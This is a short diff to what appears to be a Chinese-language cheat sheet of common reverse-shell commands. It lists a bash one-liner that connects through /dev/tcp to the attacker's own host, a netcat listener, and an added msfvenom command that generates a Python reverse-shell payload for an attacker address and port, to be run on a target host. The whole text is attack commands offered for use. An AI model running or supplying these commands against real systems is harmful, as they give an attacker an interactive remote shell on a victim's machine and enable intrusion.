@@ -1,3 +1,6 @@
 反弹shell常用命令：
 /bin/bash -i >& /dev/tcp/<自己主机ip>/<监听端口> 0>&1
 nc -lvnp <监听端口>
+
+msf python反弹shell命令，生成一段python代码，在目标主机运行即可shell:
+msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.100 LPORT=4444 -f raw
